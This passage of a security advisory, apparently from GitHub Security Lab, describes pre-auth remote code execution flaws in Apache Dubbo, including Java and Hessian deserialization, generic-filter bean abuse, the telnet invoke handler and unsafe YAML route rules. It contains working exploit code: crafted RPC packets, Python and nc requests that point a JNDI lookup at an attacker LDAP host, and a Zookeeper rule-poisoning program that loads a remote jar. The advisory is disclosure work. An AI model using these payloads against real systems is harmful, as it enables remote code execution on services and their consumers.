      <li><code class="language-plaintext highlighter-rouge">DecodeableRpcInvocatio.decode</code> leads to multiple deserializations such as the arguments one covered in <code class="language-plaintext highlighter-rouge">CVE-2020-1938</code>, or the version or attachments ones mentioned previously.</li>
    </ul>
  </li>
</ul>

<p>For example an attacker can craft an RPC NOK response like:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">// HEADER</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">header</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">16</span><span class="o">];</span>

    <span class="c1">// SET MAGIC NUMBER</span>
    <span class="nc">Bytes</span><span class="o">.</span><span class="na">short2bytes</span><span class="o">(</span><span class="no">MAGIC</span> <span class="o">,</span> <span class="n">header</span><span class="o">);</span>

    <span class="c1">// HESSIAN SERIALIZED RESPONSE</span>
    <span class="n">header</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mi">2</span><span class="o">;</span>

    <span class="c1">// NOK RESPONSE STATUS</span>
    <span class="n">header</span><span class="o">[</span><span class="mi">3</span><span class="o">]</span> <span class="o">=</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span> <span class="mi">0</span><span class="o">;</span>

    <span class="c1">// ID</span>
    <span class="nc">Bytes</span><span class="o">.</span><span class="na">long2bytes</span><span class="o">(</span><span class="mi">666</span><span class="o">,</span> <span class="n">header</span><span class="o">,</span> <span class="mi">4</span><span class="o">);</span>

    <span class="c1">// PAYLOAD</span>
    <span class="nc">Object</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">generate_spring_payload</span><span class="o">();</span>
    <span class="nc">ByteArrayOutputStream</span> <span class="n">encodedPayload</span> <span class="o">=</span> <span class="n">direct_hessian_object</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
    <span class="n">encodedPayloadSize</span> <span class="o">=</span> <span class="n">encodedPayload</span><span class="o">.</span><span class="na">size</span><span class="o">();</span>
    <span class="n">encodedPayloadBytes</span> <span class="o">=</span> <span class="n">encodedPayload</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>

    <span class="c1">// RESPONSE SIZE</span>
    <span class="nc">Bytes</span><span class="o">.</span><span class="na">int2bytes</span><span class="o">(</span><span class="n">encodedPayloadSize</span><span class="o">,</span> <span class="n">header</span><span class="o">,</span> <span class="mi">12</span><span class="o">);</span>

    <span class="c1">// WRITE HEADER AND RESPONSE</span>
    <span class="nc">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ByteArrayOutputStream</span><span class="o">();</span>
    <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">header</span><span class="o">);</span>
    <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">encodedPayloadBytes</span><span class="o">);</span>
    <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
</code></pre></div></div>

<p>This RPC packet will reach the <a href="https://github.com/apache/dubbo/blob/25761bb51b7c3a8702690bca821aa1658bcca0d7/dubbo-rpc/dubbo-rpc-dubbo/src/main/java/org/apache/dubbo/rpc/protocol/dubbo/DubboCodec.java#L100">Not Ok Response</a> which will trigger the vulnerability. Similarly RPC packets can be crafted for each scenario described above.</p>

<h4 id="impact-2">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-4-pre-auth-rce-via-java-deserialization-in-the-generic-filter-ghsl-2021-037">Issue 4: Pre-auth RCE via Java deserialization in the Generic filter (GHSL-2021-037)</h3>
<p>Apache Dubbo by default supports <a href="https://dubbo.apache.org/en/docs/v2.7/user/examples/generic-reference/">generic calls</a> to arbitrary methods exposed by provider interfaces.
These invocations are handled by the <a href="https://github.com/apache/dubbo/blob/25761bb51b7c3a8702690bca821aa1658bcca0d7/dubbo-rpc/dubbo-rpc-api/src/main/java/org/apache/dubbo/rpc/filter/GenericFilter.java">GenericFilter</a> which will find the service and method specified in the first arguments of the invocation and use the Java Reflection API to make the final call. The signature for the <code class="language-plaintext highlighter-rouge">$invoke</code> or <code class="language-plaintext highlighter-rouge">$invokeAsync</code> methods is <code class="language-plaintext highlighter-rouge">Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;</code> where the first argument is the name of the method to invoke, the second one is an array with the parameter types for the method being invoked and the third one is an array with the actual call arguments.</p>

<p>In addition, the caller also needs to set an RPC attachment specifying that the call is a generic call and how to decode the arguments. The possible values are:</p>
<ul>
  <li>true</li>
  <li>raw.return</li>
  <li>nativejava</li>
  <li>bean</li>
  <li>protobuf-json</li>
</ul>

<p>An attacker can control this RPC attachment and set it to <code class="language-plaintext highlighter-rouge">nativejava</code> to force the java deserialization of the byte array located in the third argument:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="nc">ProtocolUtils</span><span class="o">.</span><span class="na">isJavaGenericSerialization</span><span class="o">(</span><span class="n">generic</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="kt">byte</span><span class="o">[].</span><span class="na">class</span> <span class="o">==</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getClass</span><span class="o">())</span> <span class="o">{</span>
                <span class="k">try</span> <span class="o">(</span><span class="nc">UnsafeByteArrayInputStream</span> <span class="n">is</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UnsafeByteArrayInputStream</span><span class="o">((</span><span class="kt">byte</span><span class="o">[])</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]))</span> <span class="o">{</span>
                    <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="nc">ExtensionLoader</span><span class="o">.</span><span class="na">getExtensionLoader</span><span class="o">(</span><span class="nc">Serialization</span><span class="o">.</span><span class="na">class</span><span class="o">)</span>
                            <span class="o">.</span><span class="na">getExtension</span><span class="o">(</span><span class="no">GENERIC_SERIALIZATION_NATIVE_JAVA</span><span class="o">)</span>
                            <span class="o">.</span><span class="na">deserialize</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span> <span class="n">is</span><span class="o">).</span><span class="na">readObject</span><span class="o">();</span>
                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">throw</span> <span class="k">new</span> <span class="nf">RpcException</span><span class="o">(</span><span class="s">"Deserialize argument ["</span> <span class="o">+</span> <span class="o">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="o">)</span> <span class="o">+</span> <span class="s">"] failed."</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
                <span class="o">}</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">RpcException</span><span class="o">(</span>
                        <span class="s">"Generic serialization ["</span> <span class="o">+</span>
                                <span class="no">GENERIC_SERIALIZATION_NATIVE_JAVA</span> <span class="o">+</span>
                                <span class="s">"] only support message type "</span> <span class="o">+</span>
                                <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span> <span class="o">+</span>
                                <span class="s">" and your message type is "</span> <span class="o">+</span>
                                <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getClass</span><span class="o">());</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>For example, the following code will prepare an RPC request which will trigger the java deserialization sink:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    // 1.dubboVersion
    out.writeString("2.7.8");
    // 2.path
    out.writeString("org.apache.dubbo.samples.basic.api.DemoService");
    // 3.version
    out.writeString("");
    // 4.methodName
    out.writeString("$invoke");
    // 5.methodDesc
    out.writeString("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
    // 6.paramsObject
    out.writeString("sayHello");
    out.writeObject(new String[] {"java.lang.String"});
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);
    oos.writeObject(&lt;DESERIALIZATION PAYLOAD BYTE[]&gt;);
    out.writeObject(new Object[] {baos.toByteArray()});
    // 7.map
    HashMap map = new HashMap();
    map.put("generic", "nativejava");
    out.writeObject(map);
</code></pre></div></div>

<p>Note that to successfully exploit this issue, an attacker needs to know a service and method name to reach the <code class="language-plaintext highlighter-rouge">GenericFilter</code> code (eg: <code class="language-plaintext highlighter-rouge">org.apache.dubbo.samples.basic.api.DemoService</code> and <code class="language-plaintext highlighter-rouge">sayHello</code>).</p>

<p>These names are trivial to get by connecting to the Dubbo port and issuing an unauthenticated <code class="language-plaintext highlighter-rouge">ls</code> command:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ telnet localhost 20880
Trying ::1...
Connected to localhost.
Escape character is '^]'.
ls
PROVIDER:
org.apache.dubbo.samples.basic.api.DemoService

dubbo&gt;cd org.apache.dubbo.samples.basic.api.DemoService
Used the org.apache.dubbo.samples.basic.api.DemoService as default.
You can cancel default service by command: cd /
dubbo&gt;ls
Use default service org.apache.dubbo.samples.basic.api.DemoService.
org.apache.dubbo.samples.basic.api.DemoService (as provider):
        sayHello

dubbo&gt;
</code></pre></div></div>

<h4 id="impact-3">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-5-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-generic-filter-ghsl-2021-038">Issue 5: Pre-auth RCE via arbitrary bean manipulation in the Generic filter (GHSL-2021-038)</h3>
<p>As we mentioned in issue #4, the <code class="language-plaintext highlighter-rouge">GenericFilter</code> also supports additional ways of serializing the call arguments including: <code class="language-plaintext highlighter-rouge">true</code>, <code class="language-plaintext highlighter-rouge">raw.return</code> and <code class="language-plaintext highlighter-rouge">bean</code>.</p>

<p>For the case where <code class="language-plaintext highlighter-rouge">generic</code> attachment is <code class="language-plaintext highlighter-rouge">true</code> or <code class="language-plaintext highlighter-rouge">raw.return</code>, the <code class="language-plaintext highlighter-rouge">PojoUtils.realize</code> method will be invoked:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="o">(</span><span class="nc">StringUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">generic</span><span class="o">)</span>
     <span class="o">||</span> <span class="nc">ProtocolUtils</span><span class="o">.</span><span class="na">isDefaultGenericSerialization</span><span class="o">(</span><span class="n">generic</span><span class="o">)</span>
     <span class="o">||</span> <span class="nc">ProtocolUtils</span><span class="o">.</span><span class="na">isGenericReturnRawResult</span><span class="o">(</span><span class="n">generic</span><span class="o">))</span> <span class="o">{</span>
     <span class="n">args</span> <span class="o">=</span> <span class="nc">PojoUtils</span><span class="o">.</span><span class="na">realize</span><span class="o">(</span><span class="n">args</span><span class="o">,</span> <span class="n">params</span><span class="o">,</span> <span class="n">method</span><span class="o">.</span><span class="na">getGenericParameterTypes</span><span class="o">());</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>This method accepts an argument where the attacker can pass a <code class="language-plaintext highlighter-rouge">HashMap</code> containing a special key to specify the class to be instantiated and populated.</p>

<p>For example, using the python client, we can instantiate a <code class="language-plaintext highlighter-rouge">JndiConverter</code> bean (if the gadget is available in the classpath) and call its <code class="language-plaintext highlighter-rouge">setAsText</code> setter which in turn will result in the invocation of a JNDI lookup call that can be used to run arbitrary Java code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">client</span><span class="p">.</span><span class="n">send_request_and_return_response</span><span class="p">(</span>
      <span class="n">service_name</span><span class="o">=</span><span class="s">"org.apache.dubbo.samples.basic.api.DemoService"</span><span class="p">,</span>
      <span class="n">method_name</span><span class="o">=</span><span class="s">'$invoke'</span><span class="p">,</span>
      <span class="n">param_types</span><span class="o">=</span><span class="s">"Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;"</span><span class="p">,</span>
      <span class="n">service_version</span><span class="o">=</span><span class="s">""</span><span class="p">,</span>
      <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s">"sayHello"</span><span class="p">,</span> <span class="p">[</span><span class="s">"java.lang.String"</span><span class="p">],</span> <span class="p">[{</span><span class="s">"class"</span><span class="p">:</span> <span class="s">"org.apache.xbean.propertyeditor.JndiConverter"</span><span class="p">,</span> <span class="s">"asText"</span><span class="p">:</span> <span class="s">"ldap://&lt;attacker_server&gt;/foo"</span><span class="p">}]],</span>
      <span class="n">attachment</span><span class="o">=</span><span class="p">{</span><span class="s">"generic"</span><span class="p">:</span><span class="s">"raw.return"</span><span class="p">})</span>
</code></pre></div></div>

<p>In a similar way, we can set the <code class="language-plaintext highlighter-rouge">generic</code> attachment to <code class="language-plaintext highlighter-rouge">bean</code> to reach the following code:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="nc">ProtocolUtils</span><span class="o">.</span><span class="na">isBeanGenericSerialization</span><span class="o">(</span><span class="n">generic</span><span class="o">))</span> <span class="o">{</span>
      <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">args</span><span class="o">.</span><span class="na">length</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
          <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="k">instanceof</span> <span class="nc">JavaBeanDescriptor</span><span class="o">)</span> <span class="o">{</span>
              <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="nc">JavaBeanSerializeUtil</span><span class="o">.</span><span class="na">deserialize</span><span class="o">((</span><span class="nc">JavaBeanDescriptor</span><span class="o">)</span> <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
          <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
              <span class="k">throw</span> <span class="k">new</span> <span class="nf">RpcException</span><span class="o">(</span>
                      <span class="s">"Generic serialization ["</span> <span class="o">+</span>
                              <span class="no">GENERIC_SERIALIZATION_BEAN</span> <span class="o">+</span>
                              <span class="s">"] only support message type "</span> <span class="o">+</span>
                              <span class="nc">JavaBeanDescriptor</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span>
                              <span class="s">" and your message type is "</span> <span class="o">+</span>
                              <span class="n">args</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
          <span class="o">}</span>
      <span class="o">}</span>
  <span class="o">}</span>
</code></pre></div></div>

<p>In this case, <code class="language-plaintext highlighter-rouge">JavaBeanSerializerUtil.deserialize</code> will also allow us to invoke default constructors of arbitrary classes and then call setters or set field values for the constructed objects. 
For example, using the python client we can send the following request which will result into an arbitrary JNDI lookup call leading to RCE:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">beanDescriptor</span><span class="o">=</span><span class="n">new_object</span><span class="p">(</span>
        <span class="s">'org.apache.dubbo.common.beanutil.JavaBeanDescriptor'</span><span class="p">,</span>
        <span class="n">className</span><span class="o">=</span><span class="s">"org.apache.xbean.propertyeditor.JndiConverter"</span><span class="p">,</span>
        <span class="nb">type</span><span class="o">=</span><span class="mi">7</span><span class="p">,</span>
        <span class="n">properties</span><span class="o">=</span><span class="p">{</span><span class="s">"asText"</span><span class="p">:</span> <span class="s">"ldap://&lt;attacker_server&gt;/foo"</span><span class="p">}</span>
        <span class="p">)</span>

  <span class="k">return</span> <span class="n">client</span><span class="p">.</span><span class="n">send_request_and_return_response</span><span class="p">(</span>
      <span class="n">service_name</span><span class="o">=</span><span class="s">"org.apache.dubbo.samples.basic.api.DemoService"</span><span class="p">,</span>
      <span class="n">method_name</span><span class="o">=</span><span class="s">'$invoke'</span><span class="p">,</span>
      <span class="n">param_types</span><span class="o">=</span><span class="s">"Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;"</span><span class="p">,</span>
      <span class="n">service_version</span><span class="o">=</span><span class="s">""</span><span class="p">,</span>
      <span class="n">args</span><span class="o">=</span><span class="p">[</span><span class="s">"sayHello"</span><span class="p">,</span> <span class="p">[</span><span class="s">"java.lang.String"</span><span class="p">],</span> <span class="p">[</span><span class="n">beanDescriptor</span><span class="p">]],</span>
      <span class="n">attachment</span><span class="o">=</span><span class="p">{</span><span class="s">"generic"</span><span class="p">:</span><span class="s">"bean"</span><span class="p">})</span>
</code></pre></div></div>

<h4 id="impact-4">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-6-pre-auth-rce-via-arbitrary-bean-manipulation-in-the-telnet-handler-ghsl-2021-039">Issue 6: Pre-auth RCE via arbitrary bean manipulation in the Telnet handler (GHSL-2021-039)</h3>
<p>The Dubbo main service port can also be used to access a <a href="https://dubbo.apache.org/en/docs/v2.7/dev/impls/telnet-handler/">Telnet Handler</a> which offers some basic methods to collect information about the providers and methods exposed by the service and it can even allow to <strong>shutdown</strong> the service. This endpoint is unprotected.</p>

<p>Additionally a provider method can be invoked using the <a href="https://github.com/apache/dubbo/blob/master/dubbo-plugin/dubbo-qos/src/main/java/org/apache/dubbo/qos/legacy/InvokeTelnetHandler.java"><code class="language-plaintext highlighter-rouge">invoke</code> handler</a>. This handler uses a <strong>safe</strong> version of FastJson to <a href="https://github.com/apache/dubbo/blob/master/dubbo-plugin/dubbo-qos/src/main/java/org/apache/dubbo/qos/legacy/InvokeTelnetHandler.java#L81">process the call arguments</a>. However, the resulting list is later <a href="https://github.com/apache/dubbo/blob/master/dubbo-plugin/dubbo-qos/src/main/java/org/apache/dubbo/qos/legacy/InvokeTelnetHandler.java#L126">processed with <code class="language-plaintext highlighter-rouge">PojoUtils.realize</code></a> which as we saw above can be used to instantiate arbitrary classes and invoke its setters. Even though FastJson is properly protected with a default blocklist, <code class="language-plaintext highlighter-rouge">PojoUtils.realize</code> is not and an attacker can leverage that to achieve remote code execution:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "invoke org.apache.dubbo.samples.basic.api.DemoService.sayHello({'class':'org.apache.xbean.propertyeditor.JndiConverter','asText': 'ldap://attacker/foo'})" | nc -i 1 dubbo_server 20880
</code></pre></div></div>

<h4 id="impact-5">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-7-rce-on-customers-via-tag-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-040">Issue 7: RCE on customers via Tag route poisoning (Unsafe YAML unmarshaling) (GHSL-2021-040)</h3>
<p>Apache Dubbo support <a href="https://dubbo.apache.org/en/docs/v2.7/user/examples/routing-rule/#tag-routing-rules">Tag routing</a> which will enable a customer to route the request to the right server. These rules are loaded into the configuration center (eg: Zookeeper, Nacos, …) and retrieved by the customers when making a request in order to find the right endpoint.</p>

<p>When parsing these YAML rules, Dubbo customers will use SnakeYAML library to <a href="https://github.com/apache/dubbo/blob/f4b225eb3a5acdf7c9064763f522ea0b86421c8d/dubbo-cluster/src/main/java/org/apache/dubbo/rpc/cluster/router/tag/model/TagRuleParser.java#L35-L36">load the rules</a> which by default will enable calling arbitrary constructors:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TagRuleParser</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">TagRouterRule</span> <span class="nf">parse</span><span class="o">(</span><span class="nc">String</span> <span class="n">rawRule</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Constructor</span><span class="o">(</span><span class="nc">TagRouterRule</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="nc">TypeDescription</span> <span class="n">tagDescription</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TypeDescription</span><span class="o">(</span><span class="nc">TagRouterRule</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">tagDescription</span><span class="o">.</span><span class="na">addPropertyParameters</span><span class="o">(</span><span class="s">"tags"</span><span class="o">,</span> <span class="nc">Tag</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">constructor</span><span class="o">.</span><span class="na">addTypeDescription</span><span class="o">(</span><span class="n">tagDescription</span><span class="o">);</span>

        <span class="nc">Yaml</span> <span class="n">yaml</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Yaml</span><span class="o">(</span><span class="n">constructor</span><span class="o">);</span>
        <span class="nc">TagRouterRule</span> <span class="n">rule</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">rawRule</span><span class="o">);</span>
        <span class="n">rule</span><span class="o">.</span><span class="na">setRawRule</span><span class="o">(</span><span class="n">rawRule</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="nc">CollectionUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">rule</span><span class="o">.</span><span class="na">getTags</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">rule</span><span class="o">.</span><span class="na">setValid</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">rule</span><span class="o">.</span><span class="na">init</span><span class="o">();</span>
        <span class="k">return</span> <span class="n">rule</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>An attacker with access to the configuration center (Zookeeper supports authentication but its is disabled by default and in most installations, and other systems such as Nacos do not even support authentication) will be able to poison a tag rule file so when retrieved by the consumers, it will get RCE on all of them.</p>

<p>For example, the following program will deploy a Tag Route rule which, when downloaded by a customer, will download a Jar file from an attacker-controlled server and run any payload stored in the static class initializers:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

        <span class="n">client</span> <span class="o">=</span> <span class="nc">CuratorFrameworkFactory</span><span class="o">.</span><span class="na">newClient</span><span class="o">(</span><span class="n">zookeeperHost</span> <span class="o">+</span> <span class="s">":2181"</span><span class="o">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">,</span> <span class="k">new</span> <span class="nc">ExponentialBackoffRetry</span><span class="o">(</span><span class="mi">1000</span><span class="o">,</span> <span class="mi">3</span><span class="o">));</span>
        <span class="n">client</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>

        <span class="nc">String</span> <span class="n">path</span> <span class="o">=</span> <span class="s">"/dubbo/config/dubbo/"</span> <span class="o">+</span> <span class="n">provider_app_name</span> <span class="o">+</span> <span class="s">".tag-router"</span><span class="o">;</span>

        <span class="nc">String</span> <span class="n">rule</span> <span class="o">=</span> <span class="s">"---\n"</span> <span class="o">+</span>
                <span class="s">"tags:\n"</span> <span class="o">+</span>
                <span class="s">"- name: pwn\n"</span> <span class="o">+</span>
                <span class="s">"  addresses:\n"</span> <span class="o">+</span>
                <span class="s">"    - !!javax.script.ScriptEngineManager [\n"</span> <span class="o">+</span>
                <span class="s">"        !!java.net.URLClassLoader [[\n"</span> <span class="o">+</span>
                <span class="s">"          !!java.net.URL [\""</span> <span class="o">+</span> <span class="n">attackerHost</span> <span class="o">+</span> <span class="s">"\"]\n"</span> <span class="o">+</span>
                <span class="s">"        ]]\n"</span> <span class="o">+</span>
                <span class="s">"      ]"</span><span class="o">;</span>

        <span class="k">try</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">client</span><span class="o">.</span><span class="na">checkExists</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
               <span class="n">client</span><span class="o">.</span><span class="na">create</span><span class="o">().</span><span class="na">creatingParentsIfNeeded</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="n">client</span><span class="o">.</span><span class="na">setData</span><span class="o">().</span><span class="na">forPath</span><span class="o">(</span><span class="n">path</span><span class="o">,</span> <span class="n">rule</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<h4 id="impact-6">Impact</h4>
<p>This issue may lead to <code class="language-plaintext highlighter-rouge">pre-auth RCE</code></p>

<h3 id="issue-8-rce-on-customers-via-condition-route-poisoning-unsafe-yaml-unmarshaling-ghsl-2021-041">Issue 8: RCE on customers via Condition route poisoning (Unsafe YAML unmarshaling) (GHSL-2021-041)</h3>
<p>In a similar way, <a href="https://github.com/apache/dubbo/blob/f4b225eb3a5acdf7c9064763f522ea0b86421c8d/dubbo-cluster/src/main/java/org/apache/dubbo/rpc/cluster/router/condition/config/ListenableRouter.java#L70"><code class="language-plaintext highlighter-rouge">ListenableRouter</code></a> in conjunction with <a href="https://github.com/apache/dubbo/blob/f4b225eb3a5acdf7c9064763f522ea0b86421c8d/dubbo-cluster/src/main/java/org/apache/dubbo/rpc/cluster/router/condition/config/model/ConditionRuleParser.java#L44"><code class="language-plaintext highlighter-rouge">ConditionRuleParser</code></a> are also vulnerable:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ConditionRuleParser</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">ConditionRouterRule</span> <span class="nf">parse</span><span class="o">(</span><span class="nc">String</span> <span class="n">rawRule</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Constructor</span><span class="o">(</span><span class="nc">ConditionRouterRule</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

        <span class="nc">Yaml</span> <span class="n">yaml</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Yaml</span><span class="o">(</span><span class="n">constructor</span><span class="o">);</span>
        <span class="nc">ConditionRouterRule</span> <span class="n">rule</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="na">load</span><span class="o">(</span><span class="n">rawRule</span><span class="o">);</span>
        <span class="n">rule</span><span class="o">.</span><span class="na">setRawRule</span><span class="o">(</span><span class="n">rawRule</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="nc">CollectionUtils</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">(</span><span class="n">rule</span><span class="o">.</span><span class="na">getConditions</span><span class="o">()))</span> <span class="o">{</span>
            <span class="n">rule</span><span class="o">.</span><span class="na">setValid</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">rule</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>For example, the following program will deploy a Condition Route rule which, when downloaded by customers, will download a Jar file from an attacker-controlled server and run any payload stored in the static class initializers:</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>

        <span class="n">client</span> <span class="o">=</span> <span class="nc">CuratorFrameworkFactory</span><span class="o">.</span><span class="na">newClient</span><span class="o">(</span><span class="n">zookeeperHost</span> <span class="o">+</span> <span class="s">":2181"</span><span class="o">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">,</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">1000</span><span class="o">,</span> <span class="k">new</span> <span class="nc">ExponentialBackoffRetry</span><span class="o">(</span><span class="mi">1000</span><span class="o">,</span> <span class="mi">3</span><span class="o">));</span>
        <span class="n">client</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>

